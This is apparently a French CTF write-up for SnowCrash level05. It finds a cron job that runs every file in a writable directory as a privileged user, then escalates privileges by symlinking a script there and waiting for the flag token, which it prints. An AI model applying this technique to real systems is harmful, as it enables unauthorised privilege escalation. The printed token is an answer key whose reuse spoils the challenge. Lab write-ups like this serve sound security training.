# LEVEL 05

### Reconnaissance

On se connecte au level05:
```
level05@192.168.56.105's password: 
You have new mail.
```

On va regarder notre mail
```
level05@SnowCrash:~$ cat /var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Une tache cron, allons voir ce que sa fait:
```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

Le programme va lire dans le répertoire /opt/openarenaserver et execute bash -x [nom du fichier]

### Exploitation

Creons un fichier avec un lien symbolic :) et attendons un peu ...

```
level05@SnowCrash:~$ echo "getflag > /tmp/flag05" > /tmp/exploit05 ; chmod +x /tmp/exploit05 ; ln -s /tmp/exploit05 /opt/openarenaserver/pwn_flag05 ; ls -la /opt/openarenaserver/pwn_flag05 ; cat /tmp/flag05
lrwxrwxrwx 1 level05 level05 14 Jun 28 12:18 /opt/openarenaserver/pwn_flag05 -> /tmp/exploit05
cat: /tmp/flag05: No such file or directory
level05@SnowCrash:~$ cat /tmp/flag05
cat: /tmp/flag05: No such file or directory
level05@SnowCrash:~$ cat /tmp/flag05
cat: /tmp/flag05: No such file or directory
level05@SnowCrash:~$ cat /tmp/flag05
cat: /tmp/flag05: No such file or directory
level05@SnowCrash:~$ cat /tmp/flag05
cat: /tmp/flag05: No such file or directory
level05@SnowCrash:~$ cat /tmp/flag05
cat: /tmp/flag05: No such file or directory
level05@SnowCrash:~$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
level05@SnowCrash:~$ 
```
